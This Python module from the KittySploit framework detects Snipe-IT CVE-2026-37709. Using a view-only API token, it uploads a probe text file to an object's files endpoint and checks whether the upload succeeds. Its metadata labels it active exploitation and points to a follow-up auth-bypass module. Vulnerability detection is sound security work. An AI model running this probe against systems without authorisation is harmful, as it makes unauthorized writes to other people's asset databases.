#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect Snipe-IT CVE-2026-37709 view-only unauthorized file upload."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Snipe-IT CVE-2026-37709 File Upload Detect",
        "description": (
            "Detects CVE-2026-37709 in Snipe-IT ≤ 8.4.0 (fixed in 8.4.1): "
            "POST /api/v1/{object_type}/{id}/files checks the view permission "
            "instead of update, so any API user with view-only access can upload "
            "files to visible objects."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-37709"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-37709",
            "https://www.cve.org/CVERecord?id=CVE-2026-37709",
        ],
        "modules": ["auxiliary/admin/http/snipeit_cve_2026_37709_auth_bypass"],
        "tags": [
            "web",
            "scanner",
            "snipe-it",
            "snipeit",
            "auth-bypass",
            "file-upload",
            "cve-2026-37709",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["snipe-it", "snipeit"],
                "endpoint_pattern_any": ["/api/v1/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "view-only file upload"},
                    {"capability": "file_upload", "from_detail": "unauthorized attachment"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/snipeit_cve_2026_37709_auth_bypass",
                ],
            },
        },
    }

    port = OptPort(80, "Snipe-IT HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    token = OptString(
        "",
        "API Bearer token for a view-only account (required)",
        True,
    )
    object_type = OptChoice(
        "assets",
        "Snipe-IT object type to probe",
        False,
        choices=[
            "assets",
            "licenses",
            "accessories",
            "consumables",
            "components",
            "locations",
            "users",
            "departments",
            "companies",
            "maintenances",
            "models",
            "suppliers",
        ],
    )
    object_id = OptInteger(1, "Numeric object ID to target", False)

    def run(self):
        token = (self.token or "").strip()
        if not token:
            print_status("CVE-2026-37709 detect requires token")
            return False

        base = (self.path or "/").rstrip("/")
        auth = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
        }
        hardware_path = f"{base}/api/v1/hardware" if base else "/api/v1/hardware"

        try:
            check = self.http_request(
                method="GET",
                path=hardware_path,
                params={"limit": 1},
                headers=auth,
                allow_redirects=False,
                timeout=int(self.timeout or 15),
            )
        except Exception as exc:
            print_status(f"CVE-2026-37709 probe failed: {exc.__class__.__name__}")
            return False

        if not check:
            return False
        if int(check.status_code or 0) == 401:
            print_status("CVE-2026-37709 token rejected (HTTP 401)")
            return False
        if int(check.status_code or 0) == 302:
            print_status("CVE-2026-37709 redirect to login — wrong base URL or app not ready")
            return False

        object_type = str(self.object_type or "assets")
        object_id = int(self.object_id or 1)
        upload_path = (
            f"{base}/api/v1/{object_type}/{object_id}/files"
            if base
            else f"/api/v1/{object_type}/{object_id}/files"
        )
        probe_name = "cve-2026-37709-probe.txt"
        probe_body = b"CVE-2026-37709-probe"

        try:
            upload = self.http_request(
                method="POST",
                path=upload_path,
                files={"file[]": (probe_name, probe_body, "text/plain")},
                headers=auth,
                allow_redirects=False,
                timeout=int(self.timeout or 15),
            )
        except Exception:
            return False

        if not upload:
            return False

        code = int(upload.status_code or 0)
        if code == 403:
            print_status("CVE-2026-37709 patched (HTTP 403 — update permission required)")
            return False
        if code == 404:
            print_status(f"CVE-2026-37709 object {object_type}/{object_id} not found (HTTP 404)")
            return False
        if code != 200:
            return False

        body, err = parse_json_response(upload)
        if err or not body:
            return False
        if body.get("status") != "success":
            return False

        rows = (body.get("payload") or {}).get("rows") or []
        fname = rows[0].get("filename", probe_name) if rows else probe_name
        reason = (
            f"CVE-2026-37709: view-only user uploaded '{fname}' to "
            f"{object_type}/{object_id} (HTTP 200 success)"
        )
        print_status(f"CVE-2026-37709 vuln=True object={object_type}/{object_id}")
        self.set_info(
            severity="critical",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-37709",
            path=upload_path,
            object_type=object_type,
            object_id=object_id,
            filename=fname,
        )
        return True
